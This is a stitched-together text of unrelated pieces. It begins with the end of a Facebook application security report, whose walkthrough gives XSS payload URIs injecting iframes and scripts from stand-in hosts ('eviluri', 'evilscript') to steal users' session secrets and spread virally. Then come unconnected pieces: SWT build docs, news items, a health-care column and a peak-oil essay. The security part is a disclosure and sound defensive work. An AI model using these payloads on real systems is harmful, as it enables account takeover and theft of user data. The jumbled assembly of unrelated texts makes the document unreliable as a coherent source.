Sanitize all outputs .
When displaying a notice or error message , load predetermined strings instead of using dynamic inputs .
Never reuse the address of a page without fitering it for injection attempts .
Filter any information you output to an application page or via an AJAX interface .

Filter any information you output to an application page or via an AJAX interface .
Avoid user - generated HTML .
Generally , users should never be allowed to input HTML , FBML , or other rich - text formats .
When allowing rich - text data , use pre-built , tested code for processing and displaying it , rathering than trying to create your own filters .

Check every page .
Many vulnerabilities appear in secondary pages , such as ad loaders or AJAX interfaces .
Verify security precautions in every part of the application .
If possible , consider storing secondary files in a folder other than that of the application ’s canvas pages .

Verify Facebook sessions .
Never rely on a cookie , a query string , or data generated within the application to verify the current user .
Facebook provides applications with session information they can always check before making requests or loading information .

Understand third - party code .
Take the time to examine any code given to you by other developers , such as JavaScript tools or advertising network receiver files , before including them in your application .
In particular , third - party code that arnesses a user ’s session secret violates rules given by Facebook .

Do n’t simply obfuscate .
Never rely on JavaScript obfuscation or compression to hide vulnerabilities in application pages .
Such techniques may slow down an attacker for a short while , but they can always be worked around or reversed .

Educate your users .
Avoid incorporating design patterns that train users to accept bad practices , such as entering third - party passwords .
Communicate clearly your policies on privacy , data retention , and information security .
Lessons for Facebook
Stop the charade .
Nearly all instances of user information and content are essentially public .
Many users have an understanding of privacy and control not reflected by the findings of this series and others .
Either take necessary action to address these issues , or drop illusory privacy controls .

Talk to developers .
Several resources exist for helping developers get started on the Platform , but Facebook has published much less content reminding developers of security precautions .
If you associate your brand with third - party code , you have a reponsibility to help ensure the safety of that code .

Truly verify applications .
The current Verified Applications program apparently does not address basic security flaws .
Also , while opening the floodgates to any application has benefits , it also poses serious risks that may justify putting a few limits or checks in place .

Limit application access .
While it ’s encouraging to hear that Facebook will be adding granular access controls in response to the Canadian Privacy Commissioner , it ’s disheartening that such steps took so long and are still nearly a year off from full implementation .

Take clickjacking seriously .
This series has only begun to demonstrate the implications of clickjacking .
Single - click authorization of applications , even when one exempts from the Platform , only adds to the danger of clickjacking on Facebook pages .

Improve request verification .
The Facebook JavaScript API may provide much useful functionality , but it also opens the door to simple API requests with merely a session secret .
Other means exist for ensuring that requests come legitimately from an application instead of an attacker .

Distinguish your brand .
With the current Facebook Platform , any vulnerability in a third - party application becomes a vulnerability for Facebook .
Either users should be able to trust applications to the same degree as Facebook , or Facebook should more clearly distinguish third - party content .

People click applications without a second thought to the risks of rogue applications or possible security problems .
Users may seek to share personal information with friends , but fail to realize how that information is used by third - party code .
Anatomy of an Attack
I now present a more detailed explanation of how FAXX hacks allow for viral attacks and stealing user information , along with code samples .
Suppose the imaginary Facebook application “ Faceplant ” includes a parameter “ ref ” on its home page , i.e .
http://apps.facebook.com/faceplant/?ref=install.
Further suppose that one of the links within the home page ’s code appended the given ref parameter to the “ href ” attribute , i.e. < a href = ” http://apps.facebook.com/faceplant/play?ref=install”>.
Finally , suppose the application did not filter the “ ref ” parameter at all , e.g. the PHP code echo ‘< a href = ” http://apps.facebook.com/faceplant/play?ref=’.$ref.’”>’;.
As you can probably see , the “ ref ” parameter introduces a cross - site scripting hole .
For instance , loading the page http://apps.facebook.com/faceplant/?ref=”><img> would render an image element when the page loads .
Assuming Faceplant is an FBML application , one could load a URI similar to http://apps.facebook.com/faceplant/?ref=”><fb:iframe src=http://eviluri/> to render a given iframe within the page .
( Note that these URIs would need further encoding to actually function properly . )
Since the source attribute for the iframe is arbitrary , one could load a page that executes malicious scripts , such as malware delivery or browser exploitation .
So far , we ’ve simply described a standard XSS hole .
But in a Facebook application , adding an fb:iframe does not simply load a standard iframe .
The URI of the iframe page is appended with a series of session parameters , such as the current user ’s Facebook ID and the current application ’s API key .
To make a request to the Facebook API , however , requires the session secret , or the fb_sig_ss parameter .
But this parameter is only added to an iframe if the URI originates from the same path as the application itself .
Thus in the example above , http://eviluri/ would not have access to the session secret .
In a non-FBML application , one can simply insert JavaScript which checks the page ’s parameters , since the application canvas page will have the session secret .
For an FBML application , things get a bit trickier – inserted JavaScript gets filtered as FBJS and may not allow for a reliable attack .
However , buried in the source code of every FBML application page on apps .
facebook.com is the JavaScript variable “ source_url , ” which gives the direct URI of the application that Facebook loads the FBML from .
Accessing this URI directly with valid session parameters appended will load the FBML source into your web browser .
While a browser wo n’t understand all the FBML , it will still load HTML elements as HTML – including script elements .
This brings what I refer to as a double - injection trick .
If you find an XSS hole in a page on apps .
facebook.com , you ’ve actually found an XSS hole in the original FBML page that Facebook loads .
Thus you can apply the same XSS hole to the original page .
The trick works like this : use the XSS hole in the apps.facebook.com URI to insert an fb:iframe that references the original page ’s URI .
Since this page is hosted on the same path as the application , it will receive the session secret .
For example , http://apps.facebook.com/faceplant/?ref=”><fb:iframe src=http://faceplantapp/index.php >.
Now , use the XSS hole a second time by setting the URI of the inserted fb:iframe to insert JavaScript into the direct application page , that is , http://apps.facebook.com/faceplant/?ref=”><fb:iframe src=
’http://faceplantapp/index.php?ref=”>< script src=http://evilscript/>’>.
( Once again , this would have to be encoded properly , but I leave these examples unencoded to make the process more readily clear . )
The JavaScript can simply check the URI of the page that loads it to access the session secret .
But even this method does not always work .
If the direct application page includes script before the inserted code , it may fail to execute in the absence of Facebook ’s processing , and thus the inserted code will not load .
We can thus use another trick to get the session secret .
Instead of inserting JavaScript directly , insert yet another iframe , as in http://apps.facebook.com/faceplant/?ref=”><fb:iframe src=
’http://faceplantapp/index.php?ref=”>< iframe src=http://eviluri/>’>.
Now note that this second iframe is loaded by the application page , which has received the session secret from the fb:iframe .
Hence , the referrer for the second iframe will include the session secret .
The page at http://eviluri/ can simply load JavaScript that checks the referrer and grabs the session secret .
This code can then make any Facebook API request that the application itself is authorized to make under a user ’s session .
For more details on how this would work , download viraluri. txt and eviluri.
txt .
These are two text files with HTML source code for two files to be used in an attack on Flixster ( Movies ) , utilizing the hole previously reported in that application ( and now fixed ) .
The first file uses clickjacking and an invisible iframe to load an apps.facebook.com URI which inserts http://eviluri/ as above .
The second file represents the code that one would host at http://eviluri/ to then steal user information , post a link to http://viraluri/
( the address at which the first file would be hosted ) on the user ’s profile , and send a notification to a given user with a link to http://viraluri/ as well .
Finally , the code forwards the user to http://innocenturi/ to avoid any suspicion .
Wrapping Up
I could say so much more about this series and all it involved , but I feel the need to bring this report to a close .
I may post additional observations later on .
I also want to add that I do not want to come across too harshly towards application developers or Facebook – I recognize steps they have taken to help and protect users in many ways .
I can attest from experience that Facebook generally produces very secure code , for instance .
But at the same time , I still see much more that could be done , especially considering the wide range of personal information that users share on Facebook compared to other sites .
Regardless , this series provides quantifiable demonstrations of the state of application security on the Facebook Platform , and the results are far from encouraging .
I hope it will spark further dialogue about Facebook applications and social networking security in general .

How To Write Badly Well
Generating the SWT JNI Code
All of the C code used by SWT is generated by the JNIGeneratorApp application included in the SWT Tools bundle and available on the SWT Tools Update Sites .
This page describes how to use this tool when fixing bugs or adding features to SWT .
that this process has changed for SWT 3.5 .
For older versions see Generating the SWT JNI Code for SWT 3.4
Adding native methods
Add the function prototype in OS .
java , copying the style and structure of the other functions in that file .
Note that for Mac / Cocoa , portions of OS . java are also generated .
Install the latest SWT Tools from the SWT Tools Update Site .
Restart Eclipse .
Use code assist templates like jni* ( i.e. jnifield and jnimethod ) to add javadoc tags that describe flags and casts for any primitive types .
See metadata for more documentation .
Save the file .
This should build the appropriate C files .
Compile the new C code and copy the new libraries to the appropriate fragment .
Steps : right - click on the build.xml file of the appropriate fragment ( i. e. org.eclipse.swt.<ws >.< os >.< arch > ) depending on the os , platform and architecture being built
file of the appropriate fragment ( i. e. org.eclipse.swt.<ws >.< os >.< arch > ) depending on the os , platform and architecture being built select " Run As -> Ant Build ... "
on the Targets tab check the build_libraries target
target on the JRE tab select " Run in the same JRE as the workspace "
on the Refresh tab check " Refresh resources upon completion " to refresh your workspace after running the build ; this ensures that Eclipse will pick up the fresh binaries
press the " Run " button to begin
Adding structs
Often , methods return values or require parameters as a C struct .
To add a new structure , simply add a new class in the same package as the OS .
java file which matches the definition of the C structure .
This will be picked up and correctly handled by JNIGeneratorApp .
If a struct is input - only or output - only , this information can be used by JNIGeneratorApp to generate more efficient C code .
Use the flags attribute of the native function to indicate this in the metadata .
More Hints
For GTK + and Motif , all native functions must be wrapped in locking code .
When adding functions , simply copy the style and structure of the other native functions .
Many functions on Mac OS X return structs which use unions .
For an example of how to add the markup for a union , see the ControlFontStyleRec structure and its metadata .
And there you go !
If you 're having trouble , please post to the SWT mailing list or file a new bug in bugzilla .
The Fluor Daniel Corp. has agreed to pay $ 12 million to 167 workers it denied jobs 15 years ago because they belonged to or were organizing for one of four different unions .
The company dragged its feet for the 15 years since the organizing drives through hearings before the National Labor Relations Board and three federal appeals court rulings in favor of the workers .
The settlement , announced last week by the Boilermakers , the Electrical Workers , the Plumbers and Pipefitters , and the Carpenters , gives each of the workers an amount ranging from $ 8,000 to $ 217,000 , Boilermakers attorney Mike Stapp said .
The company , a non-union subsidiary of the Fluor Corp. , agreed to the settlement after the third ruling from the 6th U.S. Circuit Court of Appeals , in favor of the NLRB , the union and the workers .
The settlement ends a case that began in 1994 when the four unions started to jointly organize refinery building construction workers in Baton Rouge , La. , and nuclear plant maintenance workers at the Palo Verde reactor outside Phoenix .
The four union presidents , IBEW President Ed Hill , Boilermakers President Newton Jones , Carpenters President Doug McCarron and Plumbers President William
Hite praised the settlement in a joint statement , calling it “ unprecedented , ” and “ a large victory for the construction trades . ”
“ It ’s the largest in terms of back pay – and also the longest , ” their statement read .
“ The combined cases took nearly 20 years to litigate through the board and the appeals process .
The cases dragged on so long that 13 of the union organizers died while awaiting justice . ”
The union presidents said , “ Their deaths illustrate the need for labor law reform in the U.S. , starting with passage of the Employee Free Choice Act .
It should never take two decades for workers to receive justice under the law .
The unions claimed and the courts agreed that Fluor Daniels deliberately discriminated against pro-union workers by changing its hiring rules and by announcing a new policy that it would openly hire non-union workers , regardless of the qualifications that a union worker might have for the job .
Many of the union members who were denied jobs , particularly at Palo Verde , had , in the past , worked for Bechtel , the previous contractor overseeing maintenance .
Bechtel is unionized at Palo Verde , with its employees belonging to Ironworkers Local 75 , Boilermakers Local 627 and Millwrights Local 1914 .
Judge R.J. Cole of the 6th Circuit Court , ruled , “ Fluor Daniel intended both projects to be ‘ open shop , ’ i.e. , employees at the sites would not be part of labor organizations and there would be no union labor contract between Fluor Daniel and the hired employees .
“ The NLRB found 892 deviations from Fluor Daniel ’s hiring protocol at Palo Verde , all in favor of nonunion activists .
Analyzing the company ’s own data through Nov. 1 , 1994 , the NLRB found : nine journeymen were hired before they applied , two journeymen were hired after their applications expired , 88 journeymen were hired with less than the required 42 months of craft experience , and over 700 applicants were considered for crafts other than those for which they applied . ”
None of those hired were union members , Cole said , even though the union workers who applied met both the company ’s technical requirements and passed company administered exams .
The judge also said that Fluor Daniel arbitrarily discriminated against the unionized former Bechtel employees who had applied for their old jobs at Palo Verde .
He called that group “ an obviously well qualified and available pool of potential employees . ”
Cole also wrote that “ NLRB ’s evidence showed other instances where Fluor Daniel acted in contravention of the act ( National Labor Relations Act ) in Palo Verde by treating discriminatees differently .
Fluor Daniel allowed several discriminates to apply for nonexistent job classifications , while allowing other applicants to apply for comparable work with different job classifications .
Fluor Daniel invited non-union applicants to check back in the case of no - shows but did not invite the alleged discriminatees to do the same .
“ And Fluor Daniel never referred any of the discriminatees to its Wolf Creek nuclear project , as it did for non-union applicants .
“ All this and more , ” the judge said , as he agreed with the unions , “ showed Fluor Daniel acted out of illegal anti-union animus . ”
Asked why Fluor Daniel , after fighting the case for 15 years , finally decided to settle with the unions , Stapp , the Boliermakers ’ attorney , would not speculate .
He said , however , that the total cost to the company of its union - busting effort was $ 30 million .

A 42 - YEAR - old grandmother died from internal bleeding after she placed a home - made shower head inside her , an inquest heard yesterday .
Kilkenny Coroner ’s Court heard that Lorraine White of Upper Bridge Street , Callan , Co Kilkenny , died in hospital after collapsing in her bathroom from injuries to her uterus and abdomen caused by a 10 - inch copper pipe .
The court heard that Ms White died in surgery , six hours after being admitted to St Luke ’s Hospital , Kilkenny , on March 8th , 2008 .
A Garda investigation into her death concluded earlier this year .
One man was arrested in March 2008 in connection with her death , a file was sent to the Director of Public Prosecutions and no charges were brought .
Coroner Tim Kiely yesterday heard that Ms White had told nurses she was having a shower and that she had put the shower head “ in her front passage with the water running for some time ” .
Ms White ’s partner , Walter Morrissey , told the court Ms White was taking a shower that night when he heard a noise from upstairs .
Mr Morrissey said the bathroom door would n’t open properly and that Ms White was lying naked on the floor with her head against the door .
He said she told him she “ slipped and fell ” .
A jury of six returned a verdict of death by misadventure .
Singer Morrissey was rushed by ambulance to the Great Western Hospital tonight after he collapsed on stage just one song into a gig at The Oasis in Swindon .
The Gazette understands that an initial 999 call reported the 50 - year - old former Smiths frontman was unconscious but he was conscious when the ambulance crew arrived at the leisure centre .
His condition is said to be stable .
Morrissey , wearing a dark open - necked shirt , had appeared on stage at around 9 pm looking drawn .
He said to the 1,000 - strong audience : " Good evening ... possibly , " before launching into The Smiths ' 1983 hit This Charming Man .
He appeared to be straining to perform the song , wincing as he did so .
Just as he came to the end of the song his knees buckled and he slumped to the stage .
Assistant tour manager Charlie Browne and a stage hand rushed to his side and dragged him off stage .
He was immediately followed off by his backing band and singers .
The stage lights went up , to cat calls and whistles from the audience .
After ten minutes of silence a stage hand came to the microphone at the centre of the stage .
" We will keep you informed what 's happening , " he said .
It was another 25 minutes before a second black - clad stage hand came to the same microphone .
" Morrissey has left the building , " he said .
" Please keep your tickets and you can get a refund or come again if there are more dates . "
He was met with boos and more catcalls from some sections of the audience .
" He is seriously ill , " the announcer added .
Bizarrely , as the auditorium lights came up , the crowd filed towards the exits and the stage crew began clearing instruments and amps from the stage , Frank Sinatra 's My Way was played over the pa .
Some fans were in tears as they asked stewards for news .
The singer , whose real name is Steven Patrick Morrissey , had been taken by ambulance to the Great Western Hospital .
A hospital spokesman said the singer had suffered breathing difficulties .
Great Western Hospital site manager Deborah Allen said : " Morrissey was brought in to the Accident and Emergency department this evening .
He has been reviewed by the medical team .
His condition is stable . "
A spokesman for the Great Western Ambulance Service said : " We got a call at 9 pm and were there two minutes later with a double - crewed ambulance .
" A paramedic checked him over and he was taken to the Great Western Hospital for further assessment .
Morrissey had to cancel dates in Bristol , London and Birmingham earlier this year because of a throat illness .
He also stormed off stage in Norway in June because a beer bottle was thrown .
He left the stage at the Coachella Festival this summer after complaining about the smell from burger vans .
He is a committed vegetarian .
Some villagers have not seen any benefit from the neighbouring oil installation
By Andrew North
BBC News , al - Ahdab oil field , southern Iraq
Critics of the US invasion six years ago often said its ultimate aim was to control Iraq 's vast deposits of oil .
So it is ironic , perhaps , that the first foreign oil company to sign a production agreement with the Iraqi government since 2003 should be from America 's growing rival , China .
A year since it signed a 23 - year , $ 3bn ( £ 1.84 bn ) deal to exploit the small al - Ahdab field , in Wasit province , south of Baghdad , China 's National Petroleum Corporation ( CNPC ) has already struck oil .
But in the next door village of al - Mazzagh , there is rising discontent among residents who say their interests are being forgotten .
The deal with the Chinese is the first test of Iraq 's readiness to host foreign oil concerns - with BP , Shell and many other Western giants also jostling for access to what its oil minister Dr Hussein Sharistani calls " the last frontier " for big oil discoveries .
We are sorry , but they do n't have skills and they can't speak English
Site manager
China National Petroleum Corporation
With its budget almost entirely dependent on oil revenues , the government is desperate to boost output - which still barely matches pre-invasion levels - so it has turned to foreign companies for help .
For these companies , there 's been no opportunity like this in decades .
Iraq boasts the world 's third largest reserves of oil , with many potential fields not even tapped .
With many oil enterprises used to working in difficult places , few will be deterred by the still fragile security situation .
The regional government in Iraqi Kurdistan has signed a few deals of its own with foreign oil companies .
But the central government in Baghdad is so far refusing to recognise them and is threatening to bar the companies involved from bidding on other contracts .
Complaints
But the biggest challenge may come from Iraqis living in the oil - producing areas - as the Chinese are finding .
Their drilling operation at the Ahdab field is right next to al - Mazzagh village .
And , complains one resident , Abu Abed , right on top of his land .
Iraq 's oil sources have attracted international interest From his front door , he looks straight onto the blast walls and concrete gun towers protecting one of the Chinese drilling platforms .
" When I protested , they said they would pay compensation , " he says , " but I have received nothing . "
There were hopes too , when the Chinese company first arrived , of an employment bonanza .
" We thought everyone will find a job , " said Zahi , a village elder .
So far , they have taken on just a handful of al - Mazzagh 's residents as guards .
But the CNPC says there is little more they can do for local people .
" We are sorry , but they do n't have skills and they can't speak English , " says a site manager who agreed to come out to talk to the BBC .
He said he was n't allowed to bring reporters or anyone else inside .
People who do n't find jobs could become thieves and looters
Zahi
Village elder Although some people said the Chinese were still welcome , the mood has hardened .
There have been several reported acts of sabotage , including power lines to the drilling compounds being severed .
The Iraqi government has increased security at the site .
American helicopters from a nearby base occasionally keep watch .
And with the project due to expand once full production gets underway , Zahi warned of trouble if al - Mazzagh does not start to see more tangible benefits .
" People who do n't find jobs could become thieves and looters . "
Despite the billions it is preparing to commit , this is just a small project for the Chinese company - a pump - primer to build relations with the Iraqi government .
It is actually based on an old deal first signed with the government of Saddam Hussein in the late 1990s , but which never went any further .
Most of the projected 100,000 barrels a day output will go to a local power station , rather than for export , and CNPC is unlikely to make much profit .
Community development
This strategy appears to be working , as it is finalising terms for a joint contract with British oil giant BP to work on one of Iraq 's so - called super giant fields at Rumailah , near Basra .
Dr Sharistani says local people in places like al - Mazzagh will have to be more patient , but insists their interests will not be forgotten .
" We are instructing the oil companies , " he says , " to help build roads , bridges and other infrastructure , as part of the deals the government is signing .
" So people feel these companies are there to develop their region and not just to produce the oil and take it away . "
A new oil rush could be underway in Iraq .
But getting the oil out is likely to be the easy part for the Chinese and other foreign companies scrambling to come here .
There is just one tarmac - sealed road to the single - storey , mud -walled houses of a -Mazzagh .
Few people have any kind of steady job .
There is hardly ever any electricity and no running water in their homes .
" Life is just the same as in Saddam 's time , " says one man .

Unlike opiates such as heroin or prescription painkillers , there is no medication specifically approved to help curb cocaine consumption .
Now , an experimental vaccine offers hope for a new approach , researchers say , that spurs on antibodies , which bind with cocaine molecules and apparently helps some addicts stop feeling the pleasurable effects of the drug — thus deconditioning them out of their dependency .
Cocaine , both inhaled powder form and smoked " crack " cocaine , accounts for about one in three drug - related emergency room admissions , according to the U.S. Department of Health and Human Services .
And it has about 1.4 million users in the U.S. , Nora Volkow , director of the National Institute on Drug Abuse ( NIDA ) , said in a press briefing held today to announce the vaccine findings .
Developing a simple vaccine to help addicts stop taking the drug would be a large step in decreasing the overall number of people who use it , many of whom , Volkow noted , are between the ages of 18 and 25 .
The vaccine itself does not destroy cocaine molecules , rather it induces antibodies that bind to it , making the stimulant lose its ability to pass through the blood–brain barrier — and thus unable to trigger a high . *
To test the vaccine 's effectiveness in humans , researchers ( with some help and financial backing from Celtic Pharma ) enlisted 94 subjects who had enrolled in a methadone treatment program for opiate addiction — and who also regularly used cocaine — for a placebo - controlled , double - blind study .
( They decided on this group because methadone programs historically have better retention rates than programs for cocaine abuse only . )
One group received a placebo , another a low dosage of vaccine , whereas a third was administered a high dosage over a series of 12 weeks with five total injections .
More than half of the subjects in the high - dosage group ( 53 percent ) appeared to have laid off the cocaine for more than half of the trial period , the researchers report after tracking traces of the drug in urine samples collected three times a week .
Just less than a quarter of subjects with the low dosage had the same track record , according to the results published online yesterday in the Archives of General Psychiatry .
A drop in cocaine usage across all groups may also be attributed to a curb in opiate drug consumption from the methadone treatment .
Despite the overall decrease in cocaine use , only 38 percent of the subjects taking the high levels of vaccine achieved sufficient levels of antibodies to prevent the absorption of cocaine into the brain .
And of this minority , the functional levels of antibodies were present starting only after two months from the first vaccine and were in decline 16 to 24 weeks into the trial .
Thomas Kosten , a professor in the Menninger Department of Psychiatry and Behavioral Sciences at the Baylor College of Medicine in Houston and a lead study author , is confident that with better vaccine ingredients ( theirs used a traditional cholera toxin strengthened with an aluminum hydroxide adjuvant ) , the vaccine 's effectiveness could be improved to as high as 80 percent .
In animal trials , he noted , with newer vaccines donated from pharmaceutical companies the researchers found more than four times the amount of antibodies in the rats .
Although the vaccine lessened or negated participants ' ability to feel high from the drug , many of the trial participants still consumed cocaine — and at levels far higher than normal .
Such so - called " testing , " as Kosten noted in the press briefing , was expected and is seen in animal experiments , as well .
And even after having warned trial volunteers about the potential dangers of challenging the dosage limits when they could n't reach an expected high , some showed as much as 10 times the habitual amount of cocaine in their urine until , he said , they likely just ran out of money .
The search for a cocaine vaccine has also revealed that some individuals " seem to be immune to immunization , " Kosten said .
Like acclimation to a former allergen , he explained , it is possible for " your body [ to ] think that it 's a part of you , " and to not allow antibodies to bind to the cocaine molecule .
This may be more common , he speculates in those who have had lung tissue damage from the drug — akin to an allergist repeatedly scratching the skin to introduce an allergen .
The new findings , which Volkow called " transformative " in the briefing , may ultimately be translatable to other addictive substances , and may pave the way to creating anti-addiction vaccines for other drugs .
" We 're very enthusiastic about this , " Kosten said about this prospect .
He notes that alcohol , however , with a much smaller molecule than other drugs , may prove to be too diminutive for a similar antibody - based approach .
Aside from improving the current vaccine technology , Kosten said , one of the big challenges will be enlisting the help of what he called " Big Pharma . "
The large pharmaceutical companies are becoming more involved in developing similar technology for nicotine addiction , but , Kosten noted , they must be persuaded to investigate treatment for illicit drug addiction , " which just does n't have the profit margin that nicotine does . "

Costco Wholesale Corp. , one of the country 's largest warehouse - club chains , said it will start accepting food stamps at its 420 stores nationwide , as the number of Americans receiving government assistance continues to soar .
Under pressure from politicians , Costco began accepting food stamps at six New York City stores earlier this year and was surprised to discover that this led to a rise in memberships and sales .
Other warehouse - club chains began accepting food stamps within the last year .
" Given the economy and layoffs , this was a positive for our members and the right thing to do , " said Richard Galanti , chief financial officer of Costco , which is based in Issaquah , Wash .
More than 35 million people received food stamps in June , the most recent month for which data is available , a 22 % increase over the previous June , according the U.S. Department of Agriculture .
It was the seventh consecutive month that participation in the Supplemental Nutrition and Assistance Program increased .

Liberty activists traveled to the county jail in Westmoreland today to demonstrate on behalf of Kurt Hoffman when they stumbled onto an even bigger story – the prisoners held up signs in the windows indicating that the showers were broken and that they have no heat .
How long this has been the case is not known .
It ’s certainly not a way to treat human beings .
See the footage here :
We now have a chance to reform this cruel and capricious system .
If we let that chance slip away , there will be another Nikki dying every half - hour .
That ’s how often someone dies in America because of a lack of insurance , according to a study by a branch of the National Academy of Sciences .
Over a year , that amounts to 18,000 American deaths .
After Al Qaeda killed nearly 3,000 Americans , eight years ago on Friday , we went to war and spent hundreds of billions of dollars ensuring that this would not happen again .
Yet every two months , that many people die because of our failure to provide universal insurance  and yet many members of Congress want us to do nothing ?

Mr. Reid ’s book is a rich tour of health care around the world .
Because he has a bum shoulder , he asked doctors in many countries to examine it and make recommendations .
His American orthopedist recommended a titanium shoulder replacement that would cost tens of thousands of dollars and might or might not help .
Specialists in other countries warned that a sore shoulder did n’t justify the risks of such major surgery , although some said it would be available free if Mr. Reid insisted .
Instead , they offered physical therapy , acupuncture and other cheap and noninvasive alternatives , some of which worked pretty well .
That ’s a window into the flaws in our health care system : we offer titanium shoulder replacements for those who do n’t really need them , but we let 32 - year - old women die if they lose their health insurance .
No wonder we spend so much on medical care , and yet have some health care statistics that are worse than Slovenia’s .
My suggestion for anyone in Nikki ’s situation : commit a crime and get locked up .
In Washington State , a 20 - year - old inmate named Melissa Matthews chose to turn down parole and stay in prison because that was the only way she could get treatment for her cervical cancer .
“ If I ’m out , I ’m going to die from this cancer , ” she told a television station .
A vital safeguard to protect the world 's rainforests from being cut down has been dropped from a global deforestation treaty due to be signed at the climate summit in Copenhagen in December .
Under proposals due to be ratified at the summit , countries which cut down rainforests and convert them to plantations of trees such as oil palms would still be able to classify the result as forest and could receive millions of dollars meant for preserving them .
An earlier version of the text ruled out such a conversion but has been deleted , and the EU delegation – headed by Britain – has blocked its reinsertion .
Environmentalists say plantations are in no way a substitute for the lost natural forest in terms of wildlife , water production or , crucially , as a store of the carbon dioxide which is emitted into the atmosphere when forests are destroyed and intensifies climate change .

Now they are calling on Britain to take a lead in restoring the anti-plantations safeguard at the final negotiating session in a week 's time , saying that otherwise the agreement – which seeks to halve global deforestation rates by 2020 – will be fatally flawed .
" It is a priority for the safeguard to be reinserted , or otherwise we will have a situation where countries are paid for converting their natural forests into palm plantations , " said Emily Brickell , the climate and forests officer for the Worldwide Find for Nature ( WWF - UK ) .
" If this is not changed , the agreement will be part of the problem , not part of the solution , because it will allow things to carry on as they are now and we will continue to see the loss of natural rainforest , " added Simon Counsell , the executive director of the Rainforest Foundation .
The key piece of text which was lost said that parties to the treaty " shall protect biological diversity , including safeguards against the conversion of natural forests to forest plantations " .
It was deleted in closed negotiations but some observers think it was done at the instigation of African rainforest countries , such as the Democratic Republic of the Congo and Cameroon , while other states including Indonesia and Malaysia are believed to have supported it .
Both are heavily involved in the oil palm industry , which is a major driver of deforestation because palm oil is used to make biofuels .
A move to reinsert the clause was blocked at the last talks in Bangkok by British officials , who feared that the gains of the week 's negotiations ( the text was reduced from 19 pages to nine ) would be lost if the text were reopened .
Green campaigners accept that this was a matter of procedure but think it will have been a disastrously bad call if officials do not move swiftly to replace the lost text at the final negotiations in Barcelona , beginning a week today .
" The EU has to make sure the wording goes back in , " said Charlie Kronik , of Greenpeace .
" It 's absolutely essential , otherwise it leaves open the possibility of removing intact , high - value forests and replacing them with oil palms as party of the treaty . "
The Department of Energy and Climate Change said : " The UK is pushing hard for the strongest possible deal to stop deforestation and that includes wanting specific language in the UN text on the protection of natural forests . "
The proposed forest pact , which could be one of the most positive outcomes of the Copenhagen summit , addresses the fact that deforestation , mostly in Central and South America , Africa and Asia , now produces nearly 20 per cent of annual carbon dioxide ( CO2 ) emissions – more than from all the world 's transport .
Many policymakers consider that the key goal of limiting global warming to no more than C above the pre-industrial level will be unattainable unless the problem of deforestation emissions is tackled .
The issue , which has become known in official jargon as Redd ( reducing emissions from deforestation in developing countries ) , now has a section to itself in the proposed Copenhagen accord .
Nearly 200 countries will meet in December to try to frame a new treaty that would put the world on a path towards cutting CO2 emissions by 80 per cent by 2050 .
Scientists say this is the very minimum that can be done to keep temperature rises below C , which is regarded as the threshold of climate change that presents a real threat to humans society .
Last week , British government scientists said a potentially disastrous rise of 4C by 2060 was on the cards if emissions continued to rise at their present rate .
The Copenhagen accord , if signed , will replace the 1997 Kyoto protocol .
A deal will depend on developing nations such as China and India cutting pollution because their growing economies will be responsible for 90 per cent of CO2 emissions growth in the future .
Though it may not be apparent to most , we are in the social crisis of our era .
It is becoming increasingly clear we wo n't be able to service our large and growing debts in relation to the existing infrastructure and geopolitical landscape .
How this and the myriad social , environmental and energy related issues get prioritized will require incredibly tough decisions , ones that will only get tougher the longer we delay .
Below the fold is the latest essay from Jay Hanson , which goes , how should I put it ... a bit beyond modern media discussions on the newest details of the economic stimulus program , whether the stock market is overvalued or whether carbon sequestration is a good idea .
I do n't concur with all of his prescriptions , and the mention of state control of anything makes me viscerally squirm , but Jay has usually been ahead of the curve in grasping the bigger picture - and compared to general business as usual thinking , way ahead .
As a Campfire post I 'd hope people discuss / debate his ideas , which center around removing personhood for corporations , making lobbying illegal , and having scientists and engineers inform policy , all enabling less waste of energy and other natural resources per unit time , for a longer time .

ABSTRACT
The “ bad news ” is that “ peak oil ” marks the beginning of the end of capitalism and market politics because many decades of declining “ net energy ” [ 1 ] will result in many decades of declining economic activity .
And since capitalism ca n’t run backwards , a new method of distributing goods and services must be found .
The “ good news ” is that our “ market system ” is fantastically inefficient !
Americans could be wasting something like two billion tonnes of oil equivalent per year !!
In order to avoid anarchy , rebellion , civil war and global nuclear conflict , Americans must force a fundamental change in our political process .
We can keep the same political structures and people , but must totally eliminate special interests from our political environment .
A careful review of the progressive assault on laissez faire constitutionalism and neoclassical economics , from the 1880s through the 1930s , explains how this can be done legally and without violence .
These early progressives showed how we can save our country .
All that is lacking now is the political will .
I call this adjustment of our political environment “ America 2.0 . ”
To achieve America 2.0 , we must first separate and isolate our political system from our economic system so that government can begin to actually address and solve societal problems rather than merely catering to corporate interests .
The second step is to retire most working American citizens with an annuity sufficient for health and happiness , as government begins to eliminate the current enormous waste of vital resources by delivering goods and services directly .
This would allow most adults to stay at home with their families but still receive the goods and services they need to enjoy life .
PREFACE
“ To the free man , the country is a collection of individuals who compose it ...
He recognizes no national goal except as it is the consensus of the goals that the citizens severally serve .
He recognizes no national purpose except as it is the consensus of the purposes for which the citizens severally strive . ”
— Milton Friedman , CAPITALISM AND FREEDOM
“ We may well call it ‘ the tragedy of the commons , ’ using the word ‘ tragedy ’ as the philosopher Whitehead used it : ‘ The essence of dramatic tragedy is not unhappiness .
It resides in the solemnity of the remorseless working of things . ’ ”
— Garrett Hardin , THE TRAGEDY OF THE COMMONS
The criterion of “ profit ” has shaped our political decisions since the founding of our country , but now that we are facing peak oil , new “ scientific systems ” criteria must replace “ profit ” or our civilization will “ collapse ” [ 2 ] like so many others have throughout history .
In order for America to survive this crisis , a moderate , “ doable ” modification to our political environment is required .
This paper does not attempt to describe a complete system to replace state - sponsored capitalism and market politics .
My modest goal here is to show a way forward which could avoid the worst .
THE BAD NEWS
( Figure adapted from The Net Hubbert Curve )
Our present “ business - as - usual ” model , which requires endless economic growth and endless job creation , is no longer physically possible .
Here ’s why :
1. Business - as - usual depends upon jobs and markets to distribute goods and services .
2. Economic growth and increasing job availability require increasing net energy .
3 . Net energy correlates with peak oil and both are expected to decrease for decades .
See the “ Net Hubbert Curve ” in David Murphy ’s graph above and read this footnote : [ 3 ]
4 . Decades of decreasing net energy will cause job opportunities to decrease for decades because less and less energy will be available for economic development .
5 . Globally , millions of new workers enter the job market each year , but job availability is expected to decline by millions of positions each year .
Eventually , the projected high unemployment among young men will cause catastrophic political failures similar to those that led to Hitler ’s takeover of German democracy .
Therefore , business - as - usual is no longer a viable method of distributing goods and services and a new method must be found — and soon !
Historians will say that “ peak oil ” marked the end of the second free trade episode .
If we do n’t abandon capitalism now , we will be forced into another global war over resources :
